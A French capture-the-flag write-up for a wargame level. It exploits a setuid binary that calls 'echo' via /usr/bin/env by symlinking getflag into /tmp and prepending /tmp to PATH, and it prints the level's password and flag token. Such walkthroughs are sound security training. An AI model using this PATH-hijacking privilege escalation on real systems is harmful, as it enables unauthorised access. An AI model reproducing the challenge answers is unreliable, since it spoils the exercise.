# Level03

> login:password -> *`level03:kooda2puivaav1idi4f57q8iq`*
```
:~$ su level03
Password:kooda2puivaav1idi4f57q8iq
```
---

```
:~$ pwd
/home/user/level03
```

```
:~$ ls -la
...
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
...

:~$ file level03
setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

Le Home posséde un exécutable nommé level03.

```
:~$ ./level03
Exploit me
```

On doit essayer de le décortiquer pour l'exploiter.

```
:~$ strings level03
...
/usr/bin/env echo Exploit me
...
```

Le programme utilise `echo` via `/usr/bin/env`, ce qui va nous être utile pour appeler la commande `getflag`.
On va créer un lien symbolique de `echo` vers `getflag`.

```
:~$ ln -s /bin/getflag /tmp/echo
```

on va ensuite pouvoir ajouter `tmp` dés le début de PATH afin que le lien soit appelé

```
:~$ export PATH=/tmp:$PATH
```

On peux alors relancer l'exécutable

```
:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Le flag nous permet de se connecter au level04
`level04:qi0maab88jeaj46qoumi7maus`